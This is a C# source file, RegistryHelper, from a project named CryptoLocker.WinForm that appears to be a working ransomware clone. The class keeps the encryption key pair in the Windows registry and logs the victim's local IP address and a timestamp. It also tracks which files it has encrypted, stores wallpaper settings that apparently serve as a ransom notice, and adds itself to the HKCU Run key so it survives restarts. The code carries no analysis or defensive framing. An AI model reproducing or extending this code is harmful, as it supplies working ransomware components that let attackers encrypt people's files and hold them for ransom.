using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;

namespace CryptoLocker.WinForm
{
    public class RegistryHelper
    {
        private const string AppName = "{222037BB-96DB-4BE4-A666-2253DCFCE805}";

        public static string PrivateKey
        {
            get
            {
                var regKey = (string) Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + AppName + "\\PrivateKey", "privatekey", "");
                return regKey;
            }
        }
        
        public static string PublicKey
        {
            get
            {
                var regKey = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + AppName + "\\PublicKey", "publickey", "");
                return regKey;
            }
        }

        public static void EnsureKeysExists()
        {
            if (!string.IsNullOrEmpty(PrivateKey))
            {
                return;
            }

            var kp = Cryptography.CreateKeyPair();

            RegistryKey softwareKey = Registry.CurrentUser.OpenSubKey("Software", true);
            if (softwareKey != null)
            {
                softwareKey.CreateSubKey(AppName);

                RegistryKey cryptolockerRegKey = softwareKey.OpenSubKey(AppName, true);
                if (cryptolockerRegKey != null)
                {
                    cryptolockerRegKey.CreateSubKey("AppVersion");
                    cryptolockerRegKey.CreateSubKey("PrivateKey");
                    cryptolockerRegKey.CreateSubKey("PublicKey");
                    cryptolockerRegKey.CreateSubKey("Files");
                    cryptolockerRegKey.CreateSubKey("Wallpaper");

                    RegistryKey appVersionRegKey = cryptolockerRegKey.OpenSubKey("AppVersion", true);
                    if (appVersionRegKey != null)
                    {
                        appVersionRegKey.SetValue("ver", "1.0.0");
                        appVersionRegKey.SetValue("ip", Util.GetLocalIPAddress());
                        appVersionRegKey.SetValue("timestamp", DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:SS"));
                    }

                    RegistryKey privateRegKey = cryptolockerRegKey.OpenSubKey("PrivateKey", true);
                    privateRegKey?.SetValue("privatekey", kp.PublicAndPrivateKey);

                    RegistryKey publicRegKey = cryptolockerRegKey.OpenSubKey("PublicKey", true);
                    publicRegKey?.SetValue("publickey", kp.PublicKey);
                }
            }
        }
        
        public static void DeletePrivateKey()
        {
            RegistryKey softwareKey = Registry.CurrentUser.OpenSubKey("Software", true);
            RegistryKey cryptolockerRegKey = softwareKey?.OpenSubKey(AppName, true);
            RegistryKey privateRegKey = cryptolockerRegKey?.OpenSubKey("PrivateKey", true);
            privateRegKey?.DeleteValue("privatekey");
        }

        public static void DeleteAllKeys()
        {
            var rk = Registry.CurrentUser.OpenSubKey("Software\\" + AppName, true);
            if (rk != null)
            {
                rk.DeleteSubKey("AppVersion");
                rk.DeleteSubKey("Files");
                rk.DeleteSubKey("PublicKey");
                rk.DeleteSubKey("PrivateKey");
                rk.DeleteSubKey("Wallpaper");
            }
            var rkRun = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            var rkApp = rkRun?.OpenSubKey(AppName, true);
            if(rkApp != null) rkRun.DeleteSubKey(AppName);
        }
        
        public static Dictionary<string,string> GetEncryptedFileNames()
        {
            RegistryKey filesKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\" + AppName + "\\Files" , true);
            if (filesKey != null)
            {
                var files = filesKey.GetValueNames();

                return files.ToDictionary(k => k.Replace("?","\\"), v => (string) filesKey.GetValue(v, ""));
            }
            return new Dictionary<string, string>();
        }

        public static void InsertFileName(string filePath, string fileName)
        {
            RegistryKey filesKey = Registry.CurrentUser.OpenSubKey("Software\\" + AppName + "\\Files", true);
            filesKey.SetValue(filePath.Replace("\\","?"), fileName);
        }

        public static void RemoveFilePathFromList(string filePath)
        {
            RegistryKey filesKey = Registry.CurrentUser.OpenSubKey("Software\\" + AppName + "\\Files", true);
            filesKey.DeleteValue(filePath.Replace("\\", "?"), false);
        }
        
        public static void AddToStartup(string executablePath)
        {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rkApp.SetValue(AppName, executablePath);
        }
    }
}